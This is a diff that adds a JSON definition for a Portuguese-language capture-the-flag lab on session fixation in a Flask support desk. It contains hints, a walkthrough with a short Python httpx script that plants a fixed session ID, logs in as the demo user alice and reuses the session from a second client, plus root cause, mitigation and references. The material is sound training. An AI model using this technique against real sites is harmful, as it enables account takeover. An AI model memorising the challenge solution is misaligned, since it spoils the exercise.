@@ -1,0 +1,80 @@
+{
+  "slug": "auth-session-fixation",
+  "title": "Fixada",
+  "codename": "HELIOS DESK",
+  "summary": "A mesa de suporte aceita um ID de sessão fornecido pelo cliente e nunca o rotaciona após a autenticação. Plante uma sessão, deixe a vítima fazer login e reutilize o mesmo identificador.",
+  "category": "auth",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "auth-session-fixation",
+  "estimated_minutes": 24,
+  "xp": 200,
+  "tech": [
+    "Flask",
+    "HTTP Cookies",
+    "Server-side Sessions"
+  ],
+  "tags": [
+    "session-fixation",
+    "authentication",
+    "cookie",
+    "session-management"
+  ],
+  "story": "O suporte da Helios usa um link de login amigável para quiosques que aceita um parâmetro de query `sid`, para que operadores possam pré-criar sessões compartilhadas. A mesa autentica os usuários sobre o mesmo identificador e nunca emite um novo. Uma sessão pré-autenticação, portanto, sobrevive à trust boundary do login.",
+  "objective": "Crie uma sessão com um `sid` escolhido, autentique como `alice` e então reutilize esse mesmo ID de sessão a partir de um cliente separado para acessar `/account` e recuperar a flag.",
+  "rules": "Use a conta de demonstração `alice` / `alice123`. Fique na origem loopback atribuída; nenhum usuário real precisa estar envolvido.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag da conta de suporte",
+      "flag_type": "user",
+      "points": 200,
+      "required": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Inspecione o identificador de sessão",
+      "body": "Faça GET em `/login?sid=attacker-fixed` e inspecione a resposta. O servidor aceita o valor fornecido e o define como cookie `sid`.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Autentique sem rotacionar",
+      "body": "Faça POST das credenciais de demonstração para `/login` carregando o `sid` plantado. Compare o cookie antes e depois do login; o servidor mantém o mesmo identificador.",
+      "cost": 15
+    },
+    {
+      "level": 3,
+      "title": "Reutilize a sessão plantada",
+      "body": "Abra um segundo cliente HTTP, defina o cookie `sid=attacker-fixed` e faça GET em `/account`. A sessão server-side já está autenticada como alice.",
+      "cost": 20
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Com o cliente A, faça GET em `/login?sid=attacker-fixed`. Guarde o cookie `sid=attacker-fixed`.\n2. Faça POST em `/login` com `username=alice` e `password=alice123`, carregando esse cookie. O servidor autentica a sessão existente em vez de emitir um novo ID.\n3. Crie o cliente B e defina `sid=attacker-fixed` manualmente (ou chame `/account?sid=attacker-fixed`).\n4. Faça GET em `/account` com o identificador fixo e leia a flag.\n\n```python\nimport httpx\nbase = 'http://127.0.0.1:PORT'\na = httpx.Client(base_url=base)\na.get('/login', params={'sid': 'attacker-fixed'})\na.post('/login', data={'username': 'alice', 'password': 'alice123'})\nb = httpx.Client(base_url=base)\nb.cookies.set('sid', 'attacker-fixed')\nprint(b.get('/account').text)\n```",
+    "root_cause": "A aplicação aceita um identificador de sessão vindo do parâmetro de query `sid`, armazena-o server-side e então autentica o usuário sem gerar um novo identificador. Qualquer um que consiga plantar uma sessão no navegador da vítima pode reutilizar a sessão autenticada. Session fixation anula o propósito da etapa de login.",
+    "mitigation": "Gere IDs de sessão apenas no servidor, com uma fonte criptograficamente segura. Rejeite IDs fornecidos pelo cliente, invalide a sessão pré-autenticação no login bem-sucedido e emita um ID novo após qualquer mudança de privilégio. Defina cookies com HttpOnly, Secure e SameSite, e expire sessões ociosas server-side."
+  },
+  "references": [
+    {
+      "title": "OWASP Authentication Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Requisitos de gestão de sessão e rotação de identificador para autenticação."
+    },
+    {
+      "title": "PortSwigger — Authentication",
+      "url": "https://portswigger.net/web-security/authentication",
+      "source_type": "official",
+      "description": "Falhas de autenticação, incluindo session fixation e gestão fraca de sessão."
+    },
+    {
+      "title": "CWE-384 — Session Fixation",
+      "url": "https://cwe.mitre.org/data/definitions/384.html",
+      "source_type": "standard",
+      "description": "Definição da fraqueza de autenticar uma sessão existente e conhecida pelo atacante."
+    }
+  ]
+}
